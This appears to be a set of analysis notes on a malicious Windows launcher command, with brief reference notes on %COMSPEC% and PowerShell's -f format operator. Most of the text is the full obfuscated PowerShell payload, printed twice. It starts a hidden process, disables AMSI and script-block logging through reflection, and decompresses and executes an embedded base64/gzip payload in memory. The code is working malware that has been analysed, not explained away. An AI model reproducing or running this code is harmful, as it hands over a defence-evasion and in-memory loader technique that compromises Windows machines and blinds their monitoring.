```
%COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -noni -c "if([IntPtr]::Size -eq 4){$b=$env:windir+'\sysnative\WindowsPowerShell\v1.0\powershell.exe'}else{$b='powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c If($PSVersionTable.PSVersion.Major -ge 3){ $fy0nh=((''{''+''4}na{5}''+''le{3}c{1}i{2}t{0}''+''lo''+''ckI''+''nvocationL''+''oggin''+''g'')-f''B'',''r'',''p'',''S'',''E'',''b''); $eY5kl=[Ref].Assembly.GetType(((''{0''+''}''+''{2}ste''+''m.''+''{3}a''+''{''+''9''+''}a{6}''+''eme''+''{9''+''}t.{8}''+''{''+''1''+''}t{7}mat''+''i{7}{9}.''+''{8}m''+''si''+''{4''+''}''+''ti{5}s''+'''')-f''S'',''u'',''y'',''M'',''U'',''l'',''g'',''o'',''A'',''n'')); $fQKi8=((''ScriptB{2''+''}''+''ock{1''+''}oggi{0''+''}g'')-f''n'',''L'',''l''); if ($eY5kl) { $eY5kl.GetField(((''a''+''{3}''+''{4}i{''+''2}''+''ni''+''t{1''+''}a''+''ile{''+''0}'')-f''d'',''F'',''I'',''m'',''s''),''NonPublic,Static'').SetValue($null,$true); }; $au_v_=((''{''+''2''+''}''+''nabl{1}S''+''cri{3}{0}BlockLogging''+'''')-f''t'',''e'',''E'',''p''); $ySvT=[Collections.Generic.Dictionary[string,System.Object]]::new(); $wTX=[Ref].Assembly.GetType(((''S{3''+''}stem.''+''Ma''+''na{1}ement.{''+''0''+''}{5}tom''+''ation.{''+''4}ti{2}s'')-f''A'',''g'',''l'',''y'',''U'',''u'')); $ah=$wTX.GetField(''cachedGroupPolicySettings'',''NonPublic,Static''); If ($ah) { $nQvvC=$ah.GetValue($null); $ySvT.Add($fy0nh,0); $ySvT.Add($au_v_,0); $nQvvC[''HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\''+$fQKi8]=$ySvT; If($nQvvC[$fQKi8]){ $nQvvC[$fQKi8][$au_v_]=0; $nQvvC[$fQKi8][$fy0nh]=0; } } Else { [Ref].Assembly.GetType(((''S{''+''1}{5}tem''+''.{2}anagement.{0}''+''utomation.''+''Scri{3}tB{''+''4''+''}o''+''c''+''k'')-f''A'',''y'',''M'',''p'',''l'',''s'')).GetField(''signatures'',''NonPublic,Static'').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(((''H4sIADkvf2MCA7VX+2/iSBL+faX9H6wVEkZDwE5IdjLSSGeDjc1gB+MXj0U{0}Y{1}emof2IHwGyt//7VRucZDSZvbmTpiULd7v{0}0''+''V99VV1sytgvcBI{1}5Z8y89evv{1}CXMfEyL2LYxoF/bDONWNVa{0}98ahNwwnxl2KaTpIIk8HK8+feqXWYbi4j{1}vDFEh5DmK1gSjnG0x/2bcLc{0}Q1cN6h/yC+Ytp/NkZkmTtkcu2U9/{1}t4i5EuKAfhsnvkfd6pgpwQXb/OOPZmt5xa860mPpkZxtmqe8QFEnIKTZYv5uUYPWKUVsU8N+luTJpui4OL657thx7m2QDtqekIaKbRLkTTjL62kyVJRZXB2KajnvYZvwOskSXwiCDOV5s80sqf7lavUvdnkxPi3jAkeoo8YFypLURNkT9lHeUbw4IGiKNiuQMosMx+Gq1YJtT8kesY24JKTN/C9qWB0dauh+VIh9KwS7JkXWakNAv{1}2mlgQlQWfB5jt+Ug60YFx4AOD9TfHb1M{1}Zisk7{1}HldqMey+oLAX3aS5Li''+''S/cxwbUYD016RZCeYNqysRK3VC9pMY+sjn2//qD''+''q+lgXJwymDlaWT4GD1Kv9V8''+''Bs7p6B7vs/kAd{0}gGA1OsRdhvyY{0''+''}+15E0IagCpFOvU0H/9jm5QMKBoig0CsoyJQY34hJES5eZMUSkwBlgg9R{1}cE{0}CHj{0}a2fOcWObaqy''+''hCNA7{1}4GpjQ2kCKp3X9LiVFunc9jU7BMv{1}9v''+''MpIQc9duMiTyCgjYj''+''xDm+fBLKIqlem6/uaiUpsO/lRa1u1foa{1}YvVfhLnRVb6EFZAwDJT5GOP''+''UEDajIIDJJ5MHNbWm+/C0fcIgdQBTU8QDlihMJgFJUsGjp6J0eqYqFCjlKAINlU1Q''+''yZeCBXikiEVvbwQBc33Ha0T4cx6CkyNyBs3IdomSYo24+CsgA''+''JEQQZ2/X9OfFt6qDf9DF2Cw9YZthRPBc2Bhl+qQ8{0}SC0YVIlkBaMhZEoleju565{1}LD/taV8OB2MkieBRiSPDUc0TQHi{0}mw8diORBX{1}6tx2FvQ3NNXiZEvhpODSL5aljGCfkA2O242''+''g5qqkiCeDFwVfwb87I9Gm8{0}g/NnZHVQjEKJyF8/5BnWxnKhjqj0M1hF9R3foit+BCkZNFCXNCaBqKgblw3uMXavcjEfG{1}qZqC4tb''+''2DF8ZDbwj2JF6''+''PWV2tARdGwlb+SGQ+Wt5S3XsqY7FfjgeSNXcp3NjnktYAjuSPDecLXKdVHQleWE4qRp+OISGM+725K0I6yo+jlO{1}C4PnVS0oLHN9e+O5t+k6cjjAyDXVeGv6m76l+JHY7To2{0}6sYyZa7544HiTueHB1kkjsnjmIKq{1}DpOncCR9+OW{0}/HP/R71/CcNEsS3D0eHexYOciHKeCha{1}6x7Otk''+''YHPRndOLNkcKk{1}Do8mgn0bcxp+do{0}y/sZ32ix8''+''Gd6T{0}P68H0GPDb''+''0p4FoinJnves3fq82JvawW6+''+''h9RWFneWFSja0LmZcYvS2jmcFfHyej991HeO7j0vUnO4P2kk6Fvy/jq4nt+aUq{0}N3dTQd9sbc6f3XcXpGTNx5Ea3N7o9ijTOuQ328oOxm/OBnS6M2WKuWdNHByg''+''0lZLCuuZty71Xx/bi{1}pWC56l8Tx4s{0}XBuAiWYTQcLAGutTFOTF505UXktMnhvF1j6fgTnkEs{0}Ho00Z6Sto+PE3y08e6cfg5m+N6LFQJAAM3Ab4ljhZY5DQXvEFT6CLFo2B3iWhTPePXV5G4+OUfJlxuHRR{1}fZuGSUhAMNuB6NesNEMhwyKmNnGCf{1}S{0}x774BO0aJx+WhDLO1LPCHeY2M+RxBv4CyvcDvlMA8tiNmo3FsHHQm1''+''PPD2nhPK8vFOtinHLddNIc7RiIPckCTwTRCMSo7gvf3BfpHb82BHjWN4jvB4YBNSRah8/WBHd1LqjXo1H2w8OPb78kExT4skVyBHBtQvjuwG7jAR3PVTqJjJF2Mee917+/NvUCSWNo6Lm+tV48RFM{0}1Kf/2lEd2+KRTfaxI0L8u3HoECAtd/XcjlJJMvV/okwVSCZWlTuEdZjAh0UtB{0}1fVPICTxaTtB737oZM79BW13bLVy6b23FvOysfXaZtRLn{1}4twEeoqLTYdcYoDottm{1}vecBx0CNyR61WV88dP1k/S''+''E1spa9MeA4CpdZNKN6jDG4Zlf{1}pW0EUWcKN9F63vAQeW93D/wIV4vhQofGKSkLfgVad6ocFb5AAyHo69pO1jxQ+Qv0KPT''+''K''+''Og/dXbfq3xfOjtk5/KmsvdtoWf4L+w5nXtH77+EJO4NkXnm8WvF970BD/v+K6HC9ho''+''wgVN0LlpfBeFS5q8CW8VGsiC{1}WXQP1IP''+''ZXGlQ2teNQn/AX+6vLm/DQAA'')-f''r'',''z'')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);"
```

```
%COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -noni -c "if([IntPtr]::Size -eq 4){$b=$env:windir+'\sysnative\WindowsPowerShell\v1.0\powershell.exe'}else{$b='powershell.exe'};
$s=New-Object System.Diagnostics.ProcessStartInfo;
$s.FileName=$b;
$s.Arguments='-noni -nop -w hidden -c If($PSVersionTable.PSVersion.Major -ge 3){ $fy0nh=((''{''+''4}na{5}''+''le{3}c{1}i{2}t{0}''+''lo''+''ckI''+''nvocationL''+''oggin''+''g'')-f''B'',''r'',''p'',''S'',''E'',''b''); 
$eY5kl=[Ref].Assembly.GetType(((''{0''+''}''+''{2}ste''+''m.''+''{3}a''+''{''+''9''+''}a{6}''+''eme''+''{9''+''}t.{8}''+''{''+''1''+''}t{7}mat''+''i{7}{9}.''+''{8}m''+''si''+''{4''+''}''+''ti{5}s''+'''')-f''S'',''u'',''y'',''M'',''U'',''l'',''g'',''o'',''A'',''n'')); 
$fQKi8=((''ScriptB{2''+''}''+''ock{1''+''}oggi{0''+''}g'')-f''n'',''L'',''l''); 
if ($eY5kl) { $eY5kl.GetField(((''a''+''{3}''+''{4}i{''+''2}''+''ni''+''t{1''+''}a''+''ile{''+''0}'')-f''d'',''F'',''I'',''m'',''s''),''NonPublic,Static'').SetValue($null,$true);
}; 
$au_v_=((''{''+''2''+''}''+''nabl{1}S''+''cri{3}{0}BlockLogging''+'''')-f''t'',''e'',''E'',''p''); 
$ySvT=[Collections.Generic.Dictionary[string,System.Object]]::new(); 
$wTX=[Ref].Assembly.GetType(((''S{3''+''}stem.''+''Ma''+''na{1}ement.{''+''0''+''}{5}tom''+''ation.{''+''4}ti{2}s'')-f''A'',''g'',''l'',''y'',''U'',''u'')); 
$ah=$wTX.GetField(''cachedGroupPolicySettings'',''NonPublic,Static''); 
If ($ah) { $nQvvC=$ah.GetValue($null); 
$ySvT.Add($fy0nh,0); 
$ySvT.Add($au_v_,0); 
$nQvvC[''HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\''+$fQKi8]=$ySvT; If($nQvvC[$fQKi8]){ $nQvvC[$fQKi8][$au_v_]=0; 
$nQvvC[$fQKi8][$fy0nh]=0; 
} } Else { [Ref].Assembly.GetType(((''S{''+''1}{5}tem''+''.{2}anagement.{0}''+''utomation.''+''Scri{3}tB{''+''4''+''}o''+''c''+''k'')-f''A'',''y'',''M'',''p'',''l'',''s'')).GetField(''signatures'',''NonPublic,Static'').SetValue($null,(New-Object Collections.Generic.HashSet[string])); 
}};
&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(((''H4sIADkvf2MCA7VX+2/iSBL+faX9H6wVEkZDwE5IdjLSSGeDjc1gB+MXj0U{0}Y{1}emof2IHwGyt//7VRucZDSZvbmTpiULd7v{0}0''+''V99VV1sytgvcBI{1}5Z8y89evv{1}CXMfEyL2LYxoF/bDONWNVa{0}98ahNwwnxl2KaTpIIk8HK8+feqXWYbi4j{1}vDFEh5DmK1gSjnG0x/2bcLc{0}Q1cN6h/yC+Ytp/NkZkmTtkcu2U9/{1}t4i5EuKAfhsnvkfd6pgpwQXb/OOPZmt5xa860mPpkZxtmqe8QFEnIKTZYv5uUYPWKUVsU8N+luTJpui4OL657thx7m2QDtqekIaKbRLkTTjL62kyVJRZXB2KajnvYZvwOskSXwiCDOV5s80sqf7lavUvdnkxPi3jAkeoo8YFypLURNkT9lHeUbw4IGiKNiuQMosMx+Gq1YJtT8kesY24JKTN/C9qWB0dauh+VIh9KwS7JkXWakNAv{1}2mlgQlQWfB5jt+Ug60YFx4AOD9TfHb1M{1}Zisk7{1}HldqMey+oLAX3aS5Li''+''S/cxwbUYD016RZCeYNqysRK3VC9pMY+sjn2//qD''+''q+lgXJwymDlaWT4GD1Kv9V8''+''Bs7p6B7vs/kAd{0}gGA1OsRdhvyY{0''+''}+15E0IagCpFOvU0H/9jm5QMKBoig0CsoyJQY34hJES5eZMUSkwBlgg9R{1}cE{0}CHj{0}a2fOcWObaqy''+''hCNA7{1}4GpjQ2kCKp3X9LiVFunc9jU7BMv{1}9v''+''MpIQc9duMiTyCgjYj''+''xDm+fBLKIqlem6/uaiUpsO/lRa1u1foa{1}YvVfhLnRVb6EFZAwDJT5GOP''+''UEDajIIDJJ5MHNbWm+/C0fcIgdQBTU8QDlihMJgFJUsGjp6J0eqYqFCjlKAINlU1Q''+''yZeCBXikiEVvbwQBc33Ha0T4cx6CkyNyBs3IdomSYo24+CsgA''+''JEQQZ2/X9OfFt6qDf9DF2Cw9YZthRPBc2Bhl+qQ8{0}SC0YVIlkBaMhZEoleju565{1}LD/taV8OB2MkieBRiSPDUc0TQHi{0}mw8diORBX{1}6tx2FvQ3NNXiZEvhpODSL5aljGCfkA2O242''+''g5qqkiCeDFwVfwb87I9Gm8{0}g/NnZHVQjEKJyF8/5BnWxnKhjqj0M1hF9R3foit+BCkZNFCXNCaBqKgblw3uMXavcjEfG{1}qZqC4tb''+''2DF8ZDbwj2JF6''+''PWV2tARdGwlb+SGQ+Wt5S3XsqY7FfjgeSNXcp3NjnktYAjuSPDecLXKdVHQleWE4qRp+OISGM+725K0I6yo+jlO{1}C4PnVS0oLHN9e+O5t+k6cjjAyDXVeGv6m76l+JHY7To2{0}6sYyZa7544HiTueHB1kkjsnjmIKq{1}DpOncCR9+OW{0}/HP/R71/CcNEsS3D0eHexYOciHKeCha{1}6x7Otk''+''YHPRndOLNkcKk{1}Do8mgn0bcxp+do{0}y/sZ32ix8''+''Gd6T{0}P68H0GPDb''+''0p4FoinJnves3fq82JvawW6+''+''h9RWFneWFSja0LmZcYvS2jmcFfHyej991HeO7j0vUnO4P2kk6Fvy/jq4nt+aUq{0}N3dTQd9sbc6f3XcXpGTNx5Ea3N7o9ijTOuQ328oOxm/OBnS6M2WKuWdNHByg''+''0lZLCuuZty71Xx/bi{1}pWC56l8Tx4s{0}XBuAiWYTQcLAGutTFOTF505UXktMnhvF1j6fgTnkEs{0}Ho00Z6Sto+PE3y08e6cfg5m+N6LFQJAAM3Ab4ljhZY5DQXvEFT6CLFo2B3iWhTPePXV5G4+OUfJlxuHRR{1}fZuGSUhAMNuB6NesNEMhwyKmNnGCf{1}S{0}x774BO0aJx+WhDLO1LPCHeY2M+RxBv4CyvcDvlMA8tiNmo3FsHHQm1''+''PPD2nhPK8vFOtinHLddNIc7RiIPckCTwTRCMSo7gvf3BfpHb82BHjWN4jvB4YBNSRah8/WBHd1LqjXo1H2w8OPb78kExT4skVyBHBtQvjuwG7jAR3PVTqJjJF2Mee917+/NvUCSWNo6Lm+tV48RFM{0}1Kf/2lEd2+KRTfaxI0L8u3HoECAtd/XcjlJJMvV/okwVSCZWlTuEdZjAh0UtB{0}1fVPICTxaTtB737oZM79BW13bLVy6b23FvOysfXaZtRLn{1}4twEeoqLTYdcYoDottm{1}vecBx0CNyR61WV88dP1k/S''+''E1spa9MeA4CpdZNKN6jDG4Zlf{1}pW0EUWcKN9F63vAQeW93D/wIV4vhQofGKSkLfgVad6ocFb5AAyHo69pO1jxQ+Qv0KPT''+''K''+''Og/dXbfq3xfOjtk5/KmsvdtoWf4L+w5nXtH77+EJO4NkXnm8WvF970BD/v+K6HC9ho''+''wgVN0LlpfBeFS5q8CW8VGsiC{1}WXQP1IP''+''ZXGlQ2teNQn/AX+6vLm/DQAA'')-f''r'',''z'')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';
$s.UseShellExecute=$false;
$s.RedirectStandardOutput=$true;
$s.WindowStyle='Hidden';
$s.CreateNoWindow=$true;
$p=[System.Diagnostics.Process]::Start($s);"
```

## %COMSPEC%
https://en.wikipedia.org/wiki/COMSPEC
- COMSPEC or ComSpec is one of the environment variables used in DOS, OS/2 and Windows, which normally points to the command line interpreter, which is by default COMMAND.COM in DOS,[1] Windows 95, 98, and ME or CMD.EXE in OS/2 and Windows NT. The variable name is written in all-uppercase under DOS and OS/2. Under Windows, which also supports lowercase environment variable names, the variable name is COMSPEC inside the DOS emulator NTVDM and for any DOS programs, and ComSpec under CMD.EXE.
- The variable's contents can be displayed by typing SET COMSPEC or ECHO %COMSPEC% at the command prompt.
- The environment variable by default points to the full path of the command line interpreter. It can also be made by a different company or be a different version. 

```
HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment

Data type 	Range 	        Default value
REG_EXPAND_SZ 	Filename 	%SystemRoot%\system32\cmd.exe
```

## -f Format operator
https://ss64.com/ps/syntax-f-operator.html



## Convert Unicode to Decimal with PowerShell
https://securitytidbits.wordpress.com/2020/02/23/convert-unicode-to-decimal-with-powershell/
